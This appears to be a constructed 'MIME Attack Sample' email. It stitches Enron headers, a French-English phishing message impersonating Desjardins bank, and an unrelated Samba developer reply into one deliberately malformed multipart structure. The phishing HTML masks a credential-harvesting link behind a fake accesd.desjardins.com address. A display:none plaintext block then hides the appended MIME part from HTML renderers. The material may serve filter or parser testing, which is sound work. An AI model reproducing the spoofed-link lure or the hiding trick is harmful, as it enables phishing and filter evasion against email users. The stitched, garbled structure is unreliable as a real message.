From: matthew.scrimshaw@enron.com
To: mark.ratekin@enron.com
Subject: MIME Attack Sample
Content-Type: multipart/mixed; boundary="DELIMITER"
--DELIMITER
Content-Type: text/html
Content-Type: text/html
Content-Transfer-Encoding: 8bit
Message-Id: <E1HcQbK-0005fK-64@server.fastbox.info>
Date: Fri, 13 Apr 2007 13:34:26 -0500
X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
X-AntiAbuse: Primary Hostname - server.fastbox.info
X-AntiAbuse: Original Domain - speedy.uwaterloo.ca
X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
X-AntiAbuse: Sender Address Domain - server.fastbox.info
X-Source: 
X-Source-Args: 
X-Source-Dir: 
Status: O
Content-Length: 5798
Lines: 104

<html>

<head>
<title>Mouvement Desjardins</title>
<style type="text/css">
<!--
.style1 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
}
.style2 {
	font-size: 14px;
	font-weight: bold;
}
.style4 {font-size: 12px}
-->
</style>
</head>
<table width="777" border="0">
  <tr>
    <td width="17"> </td>
    <td width="750"><TABLE width=750 border=1 align="right" cellPadding=0 cellSpacing=0 bordercolor="e1dcd0">
      <TBODY>
        <TR>
          <TD width=750 bgcolor="efede6"><TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#009966 border=0>
              <TBODY>
                <TR>
                  <TD><IMG 
src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif"></TD>
                </TR>
              </TBODY>
            </TABLE>
              <P align="justify"><SPAN class=Estilo6><span class="style2"><FONT color=#009966> Cher(e) membre 
                Desjardins/ AccsD</FONT></span><FONT lang=0 face=Estilo size=2 
PTSIZE="10" FAMILY="SANSSERIF"><BR>
                  <BR>
                  </FONT><FONT lang=0 
PTSIZE="10" FAMILY="SANSSERIF"><span class="style1">Desjardins tient  vous signaler que votre dernire transaction n'a pas t automatiquement enregistr d  un nombre elev de transaction simultane. Le dpartement de vrification comptable du Groupe Desjardins  corriger le problme dans les comptes concerns. Si toutefois vous notez une diffrence, nous vous prions de nous en aviser. Si vous constatez une autre erreur, communiquez avec votre institution durant les heures de <a href="http://www.desjardins.com/fr/votre_caisse/index.jsp">votre caisse</a>.</span></FONT></SPAN>
              <P align="justify"><span class="Estilo6"><font size=3 face="Estilo, Helvetica, sans-serif" class="style1">Pour accder  
                votre compte et vrifier que tout soit normal, cliquez sur ce lien scuris si dessus :</font></span>
              <P align="justify"><A 
href="http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/" target=_blank type=hidden><FONT 
size=4>https://accesd.desjardins.com/</FONT></A>
              <p class=style1>Soyez assur que Desjardins met tout en oeuvre pour protger les utilisateurs de ses services Internet </p>
            <p class=Estilo6><font size=2 face="Arial, Helvetica, sans-serif" class="style1">Le Groupe 
              Desjardins vous remercie de votre clientle et apprcie votre comprhension.</font></p>
            <p class=Estilo6><STRONG><FONT face="Estilo, Helvetica, sans-serif" color=#009966 
size=2>Desjardins / AccsD</FONT></STRONG><BR>
                  <FONT size=2>Conjuguer avoirs et 
                    tres 
                </FONT></p>
            <TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#009966 border=0>
                <TBODY>
                  <TR>
                    <TD><IMG 
src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif"></TD>
                  </TR>
                </TBODY>
              </TABLE>
            <p><span class="style2"><FONT color=#009966>Dear Desjardins Member</FONT></span></p>
            <P align="justify" class="style1">The Group Desjardins would like to inform you that your last transaction was not automatically recorded due to a high number of simultaneous transactions. Desjardins audit department corrected the problem in the accounts concerned. However if you notice a difference in your folio, we ask you to advise us by communicating with your institution during <a href="http://www.desjardins.com/fr/votre_caisse/index.jsp">opening hours</a>
              <P align="justify"><span class="style1">We encourage you to    connect to your account and verify your transactions, by clicking the secured url below :<br>
                    <BR>
                </span><span class="style4"><A 
href="http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/" target=_blank type=hidden><FONT 
size=4>https://accesd.desjardins.com/</FONT></A></span><span class="style1"> </span>
              <P class=style1>Be assured that Desjardins makes every effort to protect our internet users </P>
            <P class=style1>The Group Desjardins  thanks you for your business and appreciates your comprehension</P>
            <P class=Estilo6><STRONG><FONT face="Estilo, Helvetica, sans-serif" color=#009966 
size=2><br>
              Desjardins / AccsD</FONT></STRONG><BR>
              <FONT size=2>Money working for people </FONT></P>
            <P><FONT face="Estilo, Helvetica,
sans-serif" size=2><FONT color=#999999 
size=1>Svp ne rpondez pas  ce courriel car c'est seulement un avis. Le courrier envoy  cette adresse ne peut pas tre rpondu. 
              </FONT></FONT></P>
            <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
                <TBODY>
                  <TR>
                    <TD width=5></TD>
                    <TD class="footerText Estilo2" vAlign=bottom align=left><P class=style1>Copyright  2006 Mouvement des caisses Desjardins. Tous droits 
                      rservs.</P></TD>
                    <TD align=right><P><SPAN class=bodyText></FONT></SPAN> </P></TD>
                  </TR>
                  <TR>
                    <TD width=5></TD>
                    <TD class=Estilo5 colSpan=2></TD>
                  </TR>
                </TBODY>
            </TABLE>
            <P><FONT face="Estilo, Helvetica,
sans-serif" size=2><FONT color=#999999 
size=1></FONT></FONT><img src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/securite.gif" border="0" width="140" height="39"></P></TD>
        </TR>
      </TBODY>
    </TABLE></td>
  </tr>
</table>
</P>
</body>

</html>



<style>fieldset, br{display: none;}</style>
<div style="display: none;"><plaintext>
--DELIMITER
Content-Type: multipart/signed; boundary="BOUNDARY"; protocol="application/pgp-signature"
--BOUNDARY
Content-Type: text/plain
Content-Transfer-Encoding: quoted-printable
 SHA1

simo wrote:

> Yes, the cache should help, but there are still some backends 
> that can safely be queried when offline.

I spent some more time thinking about this and it doesn't
really matter.    For example, idmap_nss is really only
needed by applications that deal in tokens like smbd.
The offlne logon geature is strictly for use by PAM
enabled applications,  And in that case, the process will
only deal in gids.  So if a user has logged in once
(which he or she must have in order to logon while offline),
the the appropriate SID/uid/gid mappings have been cached.
Same thing fro idmap_passdb.

idmap_rid should not be used for SIDs that you cannot
determine the type for which means that by definition you
have already cached that information as well.

I think you are dealing in theoreticals without actually
having tested a working system.

> In fact you shouldn't allocate if you are not able to 
> validate the SID. When offline allocation functions should
> probably not be called (previously the validation code
> was in idmap so it was easy to avoid problems ...)

You misunderstand the design of the offline logon feature
then.  The basic premise is that the core winbindd code does
not change.  So we don't have to have special code in each
winbindd API call (auth being the exception).  The cache manager
must be able to answer the query without calling the underlying
backends which are not guaranteed to work offline.  The fact
that some can is irrelevant.  The idmap cache manager must
not be required to know which ones can and which one cannot.
This is why you cannot delete expired entries from the
idmap_cache.tdb as you were previously doing.

After I've finished regression testing in the next day or so,
if you can give me a specific example where it is necessary
to actually call into an idmap backend while offline to make
something work wecan deal with that case.  But talking about
theoretical possibilities leads to bloated code.





cheers, jerry
-BOUNDARY--
Content-Type: application/pgp-signature; name="signature.asc"
BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFGPxSAIR7qMdg1EfYRAvKrAJ9BfC0Zj/TN0LkqvLU/hXKw0YFDQwCghpT8
9SRfS+oHi1ZzZzn+SeD9NJw=
=gI7b
-----END PGP SIGNATURE-----


--BOUNDARY--
--DELIMITER--
